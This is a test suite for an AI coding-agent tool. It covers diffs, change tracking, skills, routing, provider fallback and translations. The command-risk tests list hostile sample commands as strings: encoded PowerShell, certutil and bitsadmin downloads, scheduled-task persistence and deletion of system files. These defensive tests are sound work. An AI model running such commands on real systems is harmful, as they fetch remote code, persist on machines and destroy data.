import assert from 'node:assert/strict';
import { mkdirSync, readdirSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, it } from 'node:test';
import { ChangeTracker } from '../src/changes/ChangeTracker';
import { diffLines, hunksBetween, revertHunkIn, splitLines, unifiedDiff } from '../src/changes/diff';
import { NodeHost } from '../src/host/NodeHost';
import { dictionaryKeys, setLocale, t, tn } from '../src/i18n';
import { TR } from '../src/i18n/tr';
import type { AgentEvent } from '../src/orchestrator/events';
import { Orchestrator } from '../src/orchestrator/Orchestrator';
import { classifyCommand } from '../src/permissions/commandRisk';
import { PermissionManager } from '../src/permissions/PermissionManager';
import { type AIProvider, ProviderError } from '../src/providers/AIProvider';
import { isSimpleRequest } from '../src/orchestrator/routing';
import { describeModel, inferModel, isChatModelId, MODEL_CATALOG } from '../src/providers/catalog';
import { loadSkills, parseSkill } from '../src/skills/Skills';
import { applyEvent, emptySession, slimSession } from '../src/ui/transcript';
import { estimateCost } from '../src/usage/pricing';
import { call, ScriptedProvider, tempWorkspace, text } from './helpers';

const CORE_ROOT = path.resolve(__dirname, '../..');
const BUILTIN_SKILLS = path.join(CORE_ROOT, 'skills');

describe('line diff and hunks', () => {
  it('finds a minimal diff and groups changes into hunks with context', () => {
    const before = Array.from({ length: 20 }, (_, i) => `line ${i + 1}\n`).join('');
    const after = before.replace('line 2\n', 'line two\n').replace('line 18\n', 'line 18\nextra\n');
    const ops = diffLines(splitLines(before), splitLines(after));
    assert.equal(ops.filter((o) => o.type === 'delete').length, 1);
    assert.equal(ops.filter((o) => o.type === 'insert').length, 2);
    const hunks = hunksBetween(before, after);
    assert.equal(hunks.length, 2, 'changes far apart become separate hunks');
    assert.deepEqual(
      hunks[0].lines.map((l) => l.type + l.text.trim()),
      [' line 1', '-line 2', '+line two', ' line 3', ' line 4', ' line 5'],
    );
  });

  it('reverts one hunk and keeps the others, preserving CRLF line endings', () => {
    const before = 'a\r\nb\r\nc\r\nd\r\ne\r\nf\r\ng\r\nh\r\ni\r\nj\r\n';
    const after = 'A\r\nb\r\nc\r\nd\r\ne\r\nf\r\ng\r\nh\r\ni\r\nJ\r\n';
    const hunks = hunksBetween(before, after, 1);
    assert.equal(hunks.length, 2);
    assert.equal(revertHunkIn(after, hunks[0]), 'a\r\nb\r\nc\r\nd\r\ne\r\nf\r\ng\r\nh\r\ni\r\nJ\r\n');
    assert.equal(revertHunkIn(after, hunks[1]), 'A\r\nb\r\nc\r\nd\r\ne\r\nf\r\ng\r\nh\r\ni\r\nj\r\n');
  });

  it('renders a unified diff, including added files and a missing final newline', () => {
    assert.equal(unifiedDiff('new.txt', null, 'x\ny\n'), '--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1,2 @@\n+x\n+y');
    assert.match(unifiedDiff('a.txt', 'x\n', 'x'), /-x\n\+x\n\\ No newline at end of file/);
  });
});

describe('change tracker: hunk revert and checkpoints', () => {
  let ws: ReturnType<typeof tempWorkspace>;
  let host: NodeHost;
  const file = () => path.join(ws.root, 'app.js');
  const original = 'function a() {\n  return 1;\n}\n\n\n\n\n\nfunction b() {\n  return 2;\n}\n';

  beforeEach(() => {
    ws = tempWorkspace();
    host = new NodeHost({ workspaceRoot: ws.root, approve: async () => ({ approved: true }) });
    writeFileSync(file(), original);
  });
  afterEach(() => ws.cleanup());

  it('reverts a single hunk of an AI change', async () => {
    const changes = new ChangeTracker(host);
    await changes.recordBefore(file());
    writeFileSync(file(), original.replace('return 1;', 'return 10;').replace('return 2;', 'return 20;'));
    assert.equal((await changes.hunks(file())).length, 2);
    assert.equal(await changes.revertHunk(file(), 1), true);
    assert.equal(readFileSync(file(), 'utf8'), original.replace('return 1;', 'return 10;'));
    assert.equal((await changes.list())[0].added, 1);
    // Reverting the last hunk restores the original, and the file leaves the change list.
    assert.equal(await changes.revertHunk(file(), 0), true);
    assert.equal(readFileSync(file(), 'utf8'), original);
    assert.equal((await changes.list()).length, 0);
    assert.equal(changes.isTracked(file()), false);
  });

  it('keeps a single hunk: it leaves the change list, the other hunk stays reviewable', async () => {
    const changes = new ChangeTracker(host);
    await changes.recordBefore(file());
    const edited = original.replace('return 1;', 'return 10;').replace('return 2;', 'return 20;');
    writeFileSync(file(), edited);
    assert.equal(await changes.acceptHunk(file(), 0), true);
    assert.equal(readFileSync(file(), 'utf8'), edited, 'keeping never touches the file');
    const left = await changes.hunks(file());
    assert.equal(left.length, 1);
    assert.match(left[0].lines.map((l) => l.type + l.text).join(''), /-  return 2;\n\+  return 20;/);
    await changes.revert(file());
    assert.equal(readFileSync(file(), 'utf8'), original.replace('return 1;', 'return 10;'), 'revert now only undoes what was not kept');
  });

  it('a reopened task can still revert its changes (checkpoint in the snapshot)', async () => {
    const make = (provider: AIProvider) =>
      new Orchestrator({
        host,
        getProvider: () => provider,
        permissions: new PermissionManager('autonomous'),
        getSettings: () => ({ maxIterations: 10, autoVerify: false, commandTimeoutMs: 30_000 }),
      });
    const first = make(new ScriptedProvider([() => [call('edit_file', { path: 'app.js', old_string: 'return 1;', new_string: 'return 99;' })], () => [text('done')]]));
    await first.run('change a');
    const saved = JSON.parse(JSON.stringify(first.snapshot()));
    assert.deepEqual(saved.checkpoint, [{ path: 'app.js', original }]);
    first.reset();
    assert.equal((await first.changes.list()).length, 0, 'a new task starts with a clean change list');
    assert.match(readFileSync(file(), 'utf8'), /return 99;/, 'resetting never touches files');

    const second = make(new ScriptedProvider([]));
    second.restore(saved);
    const pending = await second.changes.list();
    assert.deepEqual(pending.map((c) => [c.relPath, c.status]), [['app.js', 'modified']]);
    await second.changes.revertAll();
    assert.equal(readFileSync(file(), 'utf8'), original);
  });

  it('ignores checkpoint entries that point outside the workspace', () => {
    const changes = new ChangeTracker(host);
    changes.importCheckpoint([{ path: '../evil.txt', original: 'x' }, { path: 'ok.txt', original: null }]);
    assert.equal(changes.isTracked(path.join(ws.root, 'ok.txt')), true);
    assert.equal(changes.isTracked(path.join(ws.root, '..', 'evil.txt')), false);
  });
});

describe('command risk: stronger rules', () => {
  const dangerous = (command: string, root?: string) => classifyCommand(command, { workspaceRoot: root }).risk === 'dangerous';

  it('flags encoded, elevated, download and persistence commands', () => {
    assert.ok(dangerous('powershell -NoProfile -EncodedCommand SQBFAFgA'));
    assert.ok(dangerous('pwsh -enc SQBFAFgA'));
    assert.ok(dangerous('Start-Process cmd -Verb RunAs'));
    assert.ok(dangerous('certutil -urlcache -f http://x/a.exe a.exe'));
    assert.ok(dangerous('bitsadmin /transfer job http://x/a a'));
    assert.ok(dangerous('schtasks /create /tn x /tr calc.exe /sc daily'));
    assert.ok(dangerous('setx PATH "%PATH%;C:\\x"'));
    assert.ok(dangerous('npm install -g typescript'));
    assert.ok(dangerous('git config --global user.name x'));
    assert.ok(!dangerous('npm install typescript --save-dev'));
    assert.ok(!dangerous('node -e "console.log(1)"'));
  });

  it('flags writes outside the workspace but not inside it', () => {
    const win = 'D:\\work\\app';
    assert.ok(dangerous('Remove-Item C:\\Users\\me\\notes.txt', win));
    assert.ok(dangerous('copy src\\a.txt "C:\\Program Files\\x\\a.txt"', win));
    assert.ok(dangerous('del ..\\..\\other\\file.txt', win));
    assert.ok(dangerous('Set-Content $env:USERPROFILE\\x.txt hi', win));
    assert.ok(dangerous('echo hi > C:\\temp2\\x.txt', win));
    assert.ok(!dangerous('Remove-Item D:\\work\\app\\dist\\out.js', win));
    assert.ok(!dangerous('del build\\tmp.txt', win));
    assert.ok(!dangerous('npm test > test-output.txt', win));
    assert.ok(!dangerous('dir C:\\Windows', win), 'reading outside is fine');
    const posix = '/home/me/app';
    assert.ok(dangerous('rm /etc/hosts', posix));
    assert.ok(dangerous('cp a.txt ~/a.txt', posix));
    assert.ok(!dangerous('rm build/a.o', posix));
    assert.ok(!dangerous('npm test 2>&1 > /dev/null', posix));
  });
});

describe('pricing table', () => {
  const usage = { inputTokens: 1_000_000, outputTokens: 1_000_000, cacheReadTokens: 0, cacheWriteTokens: 0 };

  it('uses user prices, most specific match first, before the built-in table', () => {
    const table = { 'openai/gpt-6-*': { input: 1, output: 2 }, 'openai/gpt-6-astra': { input: 3, output: 4 }, '*/local-*': { input: 0, output: 0 } };
    assert.deepEqual(estimateCost('openai', 'gpt-6-astra', usage, table), { kind: 'usd', usd: 7 });
    assert.deepEqual(estimateCost('openai', 'gpt-6-luna', usage, table), { kind: 'usd', usd: 3 });
    assert.deepEqual(estimateCost('custom:ollama', 'local-llama', usage, table), { kind: 'usd', usd: 0 });
    assert.deepEqual(estimateCost('gemini', 'gemini-3.8-flash', usage, table), { kind: 'unknown' });
    assert.deepEqual(estimateCost('claude', 'claude-haiku-4-5', usage), { kind: 'usd', usd: 6 });
    assert.deepEqual(estimateCost('claude', 'claude-haiku-4-5', usage, { 'claude/claude-haiku-*': { input: 0.5, output: 1 } }), { kind: 'usd', usd: 1.5 });
  });
});

describe('skills', () => {
  let ws: ReturnType<typeof tempWorkspace>;
  beforeEach(() => (ws = tempWorkspace()));
  afterEach(() => ws.cleanup());

  it('ships valid built-in skills', async () => {
    const { skills, errors } = await loadSkills([{ dir: BUILTIN_SKILLS, source: 'builtin' }]);
    assert.deepEqual(errors, []);
    for (const name of ['unity', 'debugging', 'testing', 'code-review', 'refactoring', 'git-workflow', 'security', 'performance', 'documentation', 'new-project', 'frontend']) {
      assert.ok(skills.some((s) => s.name === name && s.description.length > 30 && s.body.length > 300), name);
    }
  });

  it('user skills override built-ins by name; folder skills and bad files are handled', async () => {
    const user = path.join(ws.root, 'skills');
    mkdirSync(path.join(user, 'deploy'), { recursive: true });
    writeFileSync(path.join(user, 'debugging.md'), '---\nname: debugging\ndescription: My own debugging rules.\n---\nAlways add a log first.');
    writeFileSync(path.join(user, 'deploy', 'SKILL.md'), '---\ndescription: "Deploying to our servers."\n---\nSee checklist.md');
    writeFileSync(path.join(user, 'deploy', 'checklist.md'), '1. build 2. upload');
    writeFileSync(path.join(user, 'broken.md'), 'no front matter here');
    const { skills, errors } = await loadSkills([
      { dir: BUILTIN_SKILLS, source: 'builtin' },
      { dir: user, source: 'user' },
      { dir: path.join(ws.root, 'missing'), source: 'user' },
    ]);
    const debugging = skills.find((s) => s.name === 'debugging')!;
    assert.equal(debugging.source, 'user');
    assert.equal(debugging.body, 'Always add a log first.');
    const deploy = skills.find((s) => s.name === 'deploy')!;
    assert.equal(deploy.description, 'Deploying to our servers.');
    assert.ok(deploy.dir);
    assert.equal(errors.length, 1);
    assert.match(errors[0], /broken\.md: missing "description"/);
    assert.deepEqual(parseSkill('---\nname: Bad Name\ndescription: x\n---\nbody', 'x'), { error: 'invalid skill name "bad name" (use lowercase letters, digits and dashes)' });
  });

  it('the agent sees the skill list, loads a skill with load_skill, and sub-agents can too', async () => {
    const user = path.join(ws.root, 'skills');
    mkdirSync(path.join(user, 'deploy'), { recursive: true });
    writeFileSync(path.join(user, 'deploy', 'SKILL.md'), '---\ndescription: Deploying to our servers.\n---\nRead checklist.md first.');
    writeFileSync(path.join(user, 'deploy', 'checklist.md'), '1. build 2. upload');
    const { skills } = await loadSkills([{ dir: BUILTIN_SKILLS, source: 'builtin' }, { dir: user, source: 'user' }]);
    const main = new ScriptedProvider([
      (req) => {
        assert.match(req.system, /# Skills[\s\S]*- deploy: Deploying to our servers\.[\s\S]*- unity: Unity projects/);
        assert.ok(req.tools.some((tool) => tool.name === 'load_skill'));
        return [call('load_skill', { name: 'deploy' }), call('load_skill', { name: 'deploy', file: 'checklist.md' }), call('load_skill', { name: 'deploy', file: '../../x' })];
      },
      (req) => {
        const results = req.messages.at(-1)!.content.map((b) => (b.type === 'tool_result' ? b.content : ''));
        assert.match(results[0], /^<skill name="deploy">\nRead checklist\.md first\.\n<\/skill>$/);
        assert.equal(results[1], '1. build 2. upload');
        assert.match(results[2], /inside the skill folder/);
        return [call('run_subagent', { agent: 'explore', task: 'check' })];
      },
      () => [text('ok')],
    ]);
    const sub = new ScriptedProvider([
      (req) => {
        assert.ok(req.tools.some((tool) => tool.name === 'load_skill'), 'read-only sub-agents get load_skill');
        assert.match(req.system, /# Skills/);
        return [text('report')];
      },
    ]);
    const orchestrator = new Orchestrator({
      host: new NodeHost({ workspaceRoot: ws.root, approve: async () => ({ approved: true }) }),
      getProvider: () => main,
      permissions: new PermissionManager('balanced'),
      getSettings: () => ({ maxIterations: 10, autoVerify: false, commandTimeoutMs: 30_000 }),
      subagents: { getProfiles: () => [{ name: 'explore', description: 'x', access: 'readonly' }], getProvider: () => sub },
      skills: () => skills,
    });
    assert.equal(await orchestrator.run('deploy it'), 'completed');
    assert.equal(orchestrator.snapshot().skills?.length, skills.length);
  });

  it('a skill the user invokes rides along with the request', async () => {
    const { skills } = await loadSkills([{ dir: BUILTIN_SKILLS, source: 'builtin' }]);
    const unity = skills.find((s) => s.name === 'unity')!;
    const main = new ScriptedProvider([
      (req) => {
        const first = (req.messages[0].content[0] as { text: string }).text;
        assert.match(first, /make a player controller\n\n<skill name="unity" invoked_by="user">[\s\S]*# Unity/);
        return [text('ok')];
      },
    ]);
    const orchestrator = new Orchestrator({
      host: new NodeHost({ workspaceRoot: ws.root, approve: async () => ({ approved: true }) }),
      getProvider: () => main,
      permissions: new PermissionManager('balanced'),
      getSettings: () => ({ maxIterations: 10, autoVerify: false, commandTimeoutMs: 30_000 }),
      skills: () => skills,
    });
    const session = emptySession();
    orchestrator.on((e) => applyEvent(session, e));
    await orchestrator.run('make a player controller', undefined, [], { skills: [unity] });
    const user = session.items.find((i) => i.kind === 'user');
    assert.deepEqual(user && user.kind === 'user' ? user.skills : undefined, ['unity']);
  });
});

describe('orchestrator guards', () => {
  let ws: ReturnType<typeof tempWorkspace>;
  beforeEach(() => (ws = tempWorkspace()));
  afterEach(() => ws.cleanup());

  function make(getProvider: () => AIProvider, tokenBudget?: number) {
    const orchestrator = new Orchestrator({
      host: new NodeHost({ workspaceRoot: ws.root, approve: async () => ({ approved: true }) }),
      getProvider,
      permissions: new PermissionManager('balanced'),
      getSettings: () => ({ maxIterations: 10, autoVerify: false, commandTimeoutMs: 30_000, tokenBudget }),
    });
    const events: AgentEvent[] = [];
    orchestrator.on((e) => events.push(e));
    return { orchestrator, events };
  }

  it('pauses a request that exceeds the token budget; "continue" gets a fresh budget', async () => {
    // Each scripted turn uses 15 new tokens (10 in, 5 out).
    const provider = new ScriptedProvider(Array.from({ length: 6 }, () => () => [call('list_directory', {})]));
    const { orchestrator, events } = make(() => provider, 25);
    assert.equal(await orchestrator.run('explore'), 'budget');
    assert.equal(provider.requests.length, 2);
    const notice = events.find((e) => e.type === 'notice' && e.level === 'warning');
    assert.match(notice && notice.type === 'notice' ? notice.message : '', /used 30 tokens \(budget 25\)/);
    assert.equal(await orchestrator.run('continue'), 'budget');
    assert.equal(provider.requests.length, 4);
  });

  it('says so when the main agent switches provider or model mid-task', async () => {
    const a = new ScriptedProvider([() => [call('list_directory', {})], () => [text('done')]]);
    const b = new ScriptedProvider([() => [text('still here')]]);
    Object.defineProperty(b, 'model', { value: 'other-model' });
    let current: AIProvider = a;
    const { orchestrator, events } = make(() => current);
    await orchestrator.run('one');
    current = b;
    await orchestrator.run('two');
    const notices = events.filter((e) => e.type === 'notice').map((e) => (e.type === 'notice' ? e.message : ''));
    assert.deepEqual(notices, ['The main agent now runs on Scripted · other-model. It continues this task with the same conversation.']);
  });
});

describe('model catalog keeps up with new releases', () => {
  it('puts ids it has never seen into the right family with a version label', () => {
    assert.deepEqual(inferModel('claude-opus-6'), { id: 'claude-opus-6', label: 'Opus 6', family: 'Claude Opus' });
    assert.deepEqual(inferModel('claude-sonnet-6-1-20270101'), { id: 'claude-sonnet-6-1-20270101', label: 'Sonnet 6.1 (20270101)', family: 'Claude Sonnet' });
    assert.deepEqual(inferModel('gpt-7-nova'), { id: 'gpt-7-nova', label: 'GPT-7 Nova', family: 'GPT-7' });
    assert.deepEqual(inferModel('gemini-4.0-flash-lite'), { id: 'gemini-4.0-flash-lite', label: 'Gemini 4.0 Flash-Lite', family: 'Gemini Flash-Lite' });
    assert.deepEqual(inferModel('gemini-4.0-pro-preview'), { id: 'gemini-4.0-pro-preview', label: 'Gemini 4.0 Pro (preview)', family: 'Gemini Pro' });
    assert.equal(inferModel('llama-5-70b'), undefined);
    assert.equal(describeModel('claude', 'claude-opus-5-5').label, 'Opus 5.5', 'catalog entries win');
    assert.equal(describeModel('claude', 'claude-haiku-5').family, 'Claude Haiku');
  });

  it('leaves non-chat models out of the pickers', () => {
    assert.deepEqual(
      ['gpt-6-astra', 'text-embedding-4', 'gpt-6-tts', 'whisper-2', 'dall-e-4', 'gpt-6-realtime', 'gemini-3.8-flash'].filter(isChatModelId),
      ['gpt-6-astra', 'gemini-3.8-flash'],
    );
  });

  it('Claude Code offers aliases first: they always match the installed CLI', () => {
    const cc = MODEL_CATALOG['claude-code'];
    assert.deepEqual(cc.slice(0, 5).map((m) => m.id), ['default', 'opus', 'sonnet', 'haiku', 'fable']);
    assert.equal(cc.find((m) => m.id === 'opus')?.note, 'recommended');
    assert.equal(cc.find((m) => m.id === 'claude-opus-5-5')?.note, 'needs a recent CLI');
  });
});

describe('routing simple questions to a lighter model', () => {
  let ws: ReturnType<typeof tempWorkspace>;
  beforeEach(() => (ws = tempWorkspace()));
  afterEach(() => ws.cleanup());

  it('tells questions from work, in English and Turkish', () => {
    for (const q of ['What does the cart module do?', 'Why is total() wrong', 'explain the lobby flow', 'cart.js ne işe yarıyor?', 'Bu fonksiyon nasıl çalışıyor', 'LobbyManager nerede kullanılıyor?']) {
      assert.equal(isSimpleRequest(q), true, q);
    }
    for (const w of ['Fix the failing tests', 'Can you add a coupon field?', 'testleri düzelt', 'kupon desteği ekler misin?', 'lobby için ready durumu yap', 'Refactor cart.js', 'a'.repeat(600) + '?']) {
      assert.equal(isSimpleRequest(w), false, w.slice(0, 40));
    }
  });

  function make(main: AIProvider, light: AIProvider) {
    const orchestrator = new Orchestrator({
      host: new NodeHost({ workspaceRoot: ws.root }),
      getProvider: () => main,
      getLightProvider: () => light,
      permissions: new PermissionManager('balanced'),
      getSettings: () => ({ maxIterations: 6, autoVerify: false, commandTimeoutMs: 10_000 }),
    });
    const notices: string[] = [];
    orchestrator.on((e) => e.type === 'notice' && notices.push(e.message));
    return { orchestrator, notices };
  }

  it('a question goes to the light model; work stays on the main model', async () => {
    const light = Object.assign(new ScriptedProvider([() => [text('It sums prices.')]]), {});
    Object.defineProperty(light, 'model', { value: 'light-model' });
    const main = new ScriptedProvider([() => [text('Fixed.')]]);
    const { orchestrator, notices } = make(main, light);
    await orchestrator.run('What does the cart module do?');
    assert.equal(light.requests.length, 1);
    assert.equal(main.requests.length, 0);
    assert.match(notices[0], /A simple question: Scripted · light-model answers it/);
    await orchestrator.run('Fix the cart total');
    assert.equal(main.requests.length, 1, 'work goes to the main model');
  });

  it('if the light model tries to change something, the main model takes over', async () => {
    writeFileSync(path.join(ws.root, 'cart.js'), 'x');
    const light = new ScriptedProvider([() => [call('edit_file', { path: 'cart.js', old_string: 'x', new_string: 'y' })]]);
    const main = new ScriptedProvider([
      (req) => {
        const last = req.messages.at(-1)!.content[0] as { content: string };
        assert.match(last.content, /Not executed: this request needs changes/);
        return [text('I will change it properly.')];
      },
    ]);
    const { orchestrator, notices } = make(main, light);
    assert.equal(await orchestrator.run('why is cart.js wrong?'), 'completed');
    assert.equal(readFileSync(path.join(ws.root, 'cart.js'), 'utf8'), 'x', 'the light model changed nothing');
    assert.ok(notices.includes('This needs changes: the main model takes over.'));
  });
});

describe('fallback when a provider hits its limit', () => {
  let ws: ReturnType<typeof tempWorkspace>;
  beforeEach(() => (ws = tempWorkspace()));
  afterEach(() => ws.cleanup());

  const limited: AIProvider = {
    id: 'claude-code',
    label: 'Claude Code',
    model: 'opus',
    chat: async () => {
      throw new ProviderError("Claude Code: You've hit your session limit · resets 6pm", 'rate_limit');
    },
  };

  it('continues the same request on the fallback provider and says so', async () => {
    const backup = new ScriptedProvider([(req) => {
      assert.match((req.messages[0].content[0] as { text: string }).text, /fix it/, 'the fallback gets the same conversation');
      return [text('Fixed on the backup model.')];
    }]);
    const orchestrator = new Orchestrator({
      host: new NodeHost({ workspaceRoot: ws.root }),
      getProvider: () => limited,
      getFallbackProvider: () => backup,
      permissions: new PermissionManager('balanced'),
      getSettings: () => ({ maxIterations: 5, autoVerify: false, commandTimeoutMs: 10_000 }),
    });
    const events: AgentEvent[] = [];
    orchestrator.on((e) => events.push(e));
    assert.equal(await orchestrator.run('fix it'), 'completed');
    const notices = events.filter((e) => e.type === 'notice').map((e) => (e.type === 'notice' ? e.message : ''));
    assert.deepEqual(notices, ['Claude Code · opus is not available right now (usage limit); this request continues on Scripted · scripted-model.']);
    assert.equal(orchestrator.usageByAgent.find((u) => u.agent === 'main')?.provider, 'scripted');
  });

  it('without a fallback (or for other errors) the error ends the request as before', async () => {
    const orchestrator = new Orchestrator({
      host: new NodeHost({ workspaceRoot: ws.root }),
      getProvider: () => limited,
      permissions: new PermissionManager('balanced'),
      getSettings: () => ({ maxIterations: 5, autoVerify: false, commandTimeoutMs: 10_000 }),
    });
    assert.equal(await orchestrator.run('fix it'), 'error');
    assert.match(orchestrator.lastError ?? '', /session limit/);
  });
});

describe('saved sessions stay small', () => {
  it('slimSession cuts long tool output, also inside sub-agents', () => {
    const long = 'x'.repeat(50_000);
    const session = emptySession();
    session.items.push({
      kind: 'tool',
      id: 't1',
      liveOutput: long,
      call: { id: 't1', name: 'run_command', title: 'Run', category: 'command', risk: 'normal', status: 'done', output: long },
      sub: {
        agent: 'explore',
        running: true,
        phase: 'thinking',
        items: [{ kind: 'tool', id: 't2', liveOutput: '', call: { id: 't2', name: 'read_file', title: 'Read', category: 'read', risk: 'safe', status: 'done', output: long } }],
      },
    });
    const slim = slimSession(session, 1000);
    assert.ok(JSON.stringify(slim).length < 3_000);
    assert.equal(session.items[0].kind === 'tool' && session.items[0].liveOutput.length, 50_000, 'the live session is untouched');
  });
});

describe('i18n', () => {
  afterEach(() => setLocale('en'));

  it('translates by English key and fills placeholders; unknown keys fall back to English', () => {
    assert.equal(t('Paused after {n} steps. Send "continue" to let the agent keep going.', { n: 3 }), 'Paused after 3 steps. Send "continue" to let the agent keep going.');
    setLocale('tr-TR');
    assert.notEqual(t('Nothing to compact yet.'), 'Nothing to compact yet.');
    assert.equal(t('some text nobody translated'), 'some text nobody translated');
    assert.equal(tn('{n} call', '{n} calls', 1), TR['{n} call'].replace('{n}', '1'));
    setLocale('de');
    assert.equal(t('Nothing to compact yet.'), 'Nothing to compact yet.');
  });

  it('every t()/tn() string in the core, the chat UI and every app (extension, CLI, desktop) has a Turkish translation', () => {
    const files = [
      ...walk(path.join(CORE_ROOT, 'src')),
      ...walk(path.resolve(CORE_ROOT, '../app/src')),
      ...walk(path.resolve(CORE_ROOT, '../app/webview')),
      ...walk(path.resolve(CORE_ROOT, '../vscode-extension/src')),
      ...walk(path.resolve(CORE_ROOT, '../cli/src')),
      ...walk(path.resolve(CORE_ROOT, '../desktop/src')),
    ].filter((f) => f.endsWith('.ts'));
    const keys = new Set<string>();
    const lit = String.raw`'((?:[^'\\]|\\.)*)'`;
    for (const file of files) {
      const source = readFileSync(file, 'utf8');
      for (const m of source.matchAll(new RegExp(String.raw`\bt\(\s*${lit}`, 'g'))) keys.add(unescape(m[1]));
      for (const m of source.matchAll(new RegExp(String.raw`\btn\(\s*${lit}\s*,\s*${lit}`, 'g'))) {
        keys.add(unescape(m[1]));
        keys.add(unescape(m[2]));
      }
    }
    assert.ok(keys.size > 50, `found ${keys.size} keys`);
    const known = new Set(dictionaryKeys('tr'));
    const missing = [...keys].filter((k) => !known.has(k));
    assert.deepEqual(missing, [], `missing Turkish translations:\n${missing.join('\n')}`);
    for (const [key, value] of Object.entries(TR)) {
      const placeholders = (s: string) => [...s.matchAll(/\{(\w+)\}/g)].map((m) => m[1]).sort().join(',');
      assert.equal(placeholders(value), placeholders(key), `placeholders differ for: ${key}`);
      assert.doesNotMatch(value, /beceri/i, 'Skills stays "Skills" in Turkish');
    }
  });
});

function unescape(s: string): string {
  return s.replace(/\\(.)/g, (_, c: string) => (c === 'n' ? '\n' : c));
}

function walk(dir: string): string[] {
  const out: string[] = [];
  for (const name of readdirSync(dir)) {
    const full = path.join(dir, name);
    if (statSync(full).isDirectory()) out.push(...walk(full));
    else out.push(full);
  }
  return out;
}
